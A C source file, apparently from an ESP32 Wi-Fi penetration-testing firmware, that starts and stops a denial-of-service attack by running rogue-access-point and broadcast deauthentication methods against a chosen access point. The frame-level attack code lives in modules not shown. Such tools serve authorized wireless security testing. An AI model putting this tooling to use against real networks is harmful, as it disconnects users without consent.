/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    attack_method_rogueap(attack_config->ap_record);
    attack_method_broadcast(attack_config->ap_record, attack_config->timeout);
}

void attack_dos_stop() {
    attack_method_broadcast_stop();
    wifictl_mgmt_ap_start();
    wifictl_restore_ap_mac();
    ESP_LOGI(TAG, "DoS attack stopped");
}